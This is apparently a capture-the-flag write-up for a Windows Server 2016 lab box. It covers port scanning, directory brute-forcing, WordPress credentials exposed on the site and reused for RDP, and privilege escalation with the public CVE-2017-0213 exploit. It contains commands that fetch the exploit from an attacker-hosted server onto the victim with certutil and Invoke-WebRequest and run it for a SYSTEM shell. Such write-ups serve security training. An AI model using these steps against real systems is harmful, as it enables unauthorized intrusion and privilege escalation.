
### Enumeration

**Initial Port Scan**

An initial scan was performed using `scapot` to identify open ports on the target and uncover potential attack vectors:
```
scapot -t <IP> -m top -b 
```
<img src="/budahacksecurity/uploads/md_images/retro/retro.png" style="max-width:100%; border-radius:8px;">

The scan revealed **two open ports**:

- `80/tcp` — HTTP
- `3389/tcp` — RDP (Remote Desktop Protocol)


**Detailed Enumeration with Nmap**

Both ports were then enumerated using Nmap NSE scripts to gather deeper information about running services, versions, and configurations:

```
sudo nmap  -p3389,80 -Pn -n -sSVC --min-rate 5000 10.66.149.222
Deploying root access for bda. Password pls:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 14:33 -0500
Nmap scan report for 10.66.149.222
Host is up (0.10s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2026-03-25T19:33:24+00:00
|_ssl-date: 2026-03-25T19:33:29+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2026-03-24T19:24:31
|_Not valid after:  2026-09-23T19:24:31
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -2s


```

**Key findings:**

- The web server is running **Microsoft IIS 10.0** with the `TRACE` method enabled, which may be exploitable via Cross-Site Tracing (XST).
- The RDP service leaks sensitive information through NTLM negotiation:
    - **Hostname:** `RetroWeb`
    - **NetBIOS Domain:** `RETROWEB`
    - **OS Version:** `Windows Server 2016 (10.0.14393)`
- The RDP service uses a self-signed SSL certificate valid for 6 months.


**Hidden Directory Discovery with Gobuster**

In order to identify non-publicly visible paths and directories, a web directory enumeration was conducted using **Gobuster** with a DirBuster wordlist:

```bash
gobuster dir -u http://10.66.149.222/ -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt
```


**Credential Discovery in the Web Application**

Upon accessing the `/retro` directory, a **WordPress-based web application** was identified. Through manual inspection of the site's published content, both the **username** and **password** for the administration panel were successfully retrieved.

>  The credentials were found exposed directly within the application's visible content, requiring no advanced exploitation techniques — representing a critical **sensitive information disclosure** vulnerability.

<img src="/budahacksecurity/uploads/md_images/retro/retro2.png" style="max-width:100%; border-radius:8px;">



Using the obtained credentials, a successful login was performed on the WordPress administration panel located at:

```
http://10.66.149.222/retro/wp-login.php
```

### Access the server

**Credential Reuse — Remote Desktop Protocol Access**

Since the **RDP service (port 3389)** was found exposed during the initial reconnaissance phase, the previously obtained WordPress credentials were tested for reuse against the remote desktop service.

The authentication attempt was **successful**, establishing a remote desktop session on the target system:

```bash
xfreerdp /u:wade /p:parzival /v:10.66.149.222
```



### Privilege Escalate

**Download and Transfer the Exploit**

Since the target runs **Windows Server 2016 (Build 10.0.14393)**, the precompiled binary from the public repository was used:

**Download the ZIP (on your attack machine):**

```bash
wget https://github.com/WindowsExploits/Exploits/raw/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zip
```

**Extract the binary:**

```bash
unzip CVE-2017-0213_x64.zip
```

This produces: `CVE-2017-0213_x64.exe`

**Start an HTTP server on the attack machine:**

```bash
python3 -m http.server 8080
```

**Download the exploit from the victim machine (RDP session as `wade`):**

Open PowerShell in the RDP session and run:

```powershell
certutil -urlcache -f http://<YOUR_IP>:8080/CVE-2017-0213_x64.exe CVE-2017-0213_x64.exe
```

Or alternatively:


```powershell
Invoke-WebRequest -Uri "http://<YOUR_IP>:8080/CVE-2017-0213_x64.exe" -OutFile "CVE-2017-0213_x64.exe"
```

**Execute the exploit:**

```cmd
.\CVE-2017-0213_x64.exe
```

If successful, a new `cmd.exe` shell will spawn with **`NT AUTHORITY\SYSTEM`** privileges.

<img src="/budahacksecurity/uploads/md_images/retro/retro3.png" style="max-width:100%; border-radius:8px;">
